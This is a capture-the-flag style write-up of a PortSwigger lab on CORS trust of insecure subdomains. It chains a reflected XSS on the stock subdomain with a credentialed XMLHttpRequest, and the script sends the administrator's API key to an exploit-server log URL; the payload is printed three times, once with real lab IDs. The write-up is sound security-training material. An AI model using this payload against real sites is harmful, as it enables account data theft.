Title: CORS vulnerability with trusted insecure protocols
Level: Practitioner
Desc:  This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
You can log in to your own account using the following credentials: wiener:peter 

# Walkthrough: 
We have reflected Origin in Acces-Control-Allow-Origin for http://subdomain.lab-id
<img width="1245" height="345" alt="image" src="https://github.com/user-attachments/assets/b549a04a-fc2a-4ef3-852a-80bcd3b3af17" />

The "check stock" functionallity in product page request subdomain: stock.lab-id
<img width="1120" height="325" alt="image" src="https://github.com/user-attachments/assets/2d19e621-5d22-4cd6-92ed-53fbb9d7c9fc" />

In productId parameter in request to subdomain we have XSS vulnerability:
<img width="609" height="311" alt="image" src="https://github.com/user-attachments/assets/0d4813d5-f607-445b-a3bb-1829f1d04334" />

In exploit server run: 
```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

It is code: 
```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
 req.withCredentials = true;
 req.send();
 function reqListener() {
  location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText;
 };
 %3c/script>&storeId=1"
</script>
```

```
<script>
    document.location="http://stock.0a8a003403b6eb7280cbb2d600980063.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a8a003403b6eb7280cbb2d600980063.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0acb0010039eebaf800ab131014f00cb.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
We can see the API key in URL:
<img width="1496" height="210" alt="image" src="https://github.com/user-attachments/assets/a682a57e-28b4-4ab5-b941-895d7fd4e01b" />


nwYf8SYzizZ71zlXB9CCtin0hN5hZ7om

For victim: 
<img width="1471" height="170" alt="image" src="https://github.com/user-attachments/assets/4371384f-d73b-4da8-9e15-0f848136df06" />


# Bonus:
1) in my opinion now Lab works like no matter if we have exploit server to read response, because we reed response from the url which was populated in the victim browser, but the request is not sended. I'm not sure about that...
<img width="1258" height="325" alt="image" src="https://github.com/user-attachments/assets/54422a6e-0d60-4f7b-a979-55715c963be0" />
I still can see my api token after viewing exploit.
<img width="1216" height="235" alt="image" src="https://github.com/user-attachments/assets/fbeba208-c8e9-489a-b53e-068166755ac5" />
As I thought.

2) I also changed the protocol from http to https in request to subdomain and it changed nothing.
<img width="1257" height="325" alt="image" src="https://github.com/user-attachments/assets/fe5982bf-d46b-432e-96ef-663e76dbbb28" />
In case of a victim it was crutial to send request with http instead of https, I don't know why.
<img width="1471" height="170" alt="image" src="https://github.com/user-attachments/assets/f2de2b3a-7700-4b98-8a4c-359160652d5b" />

 




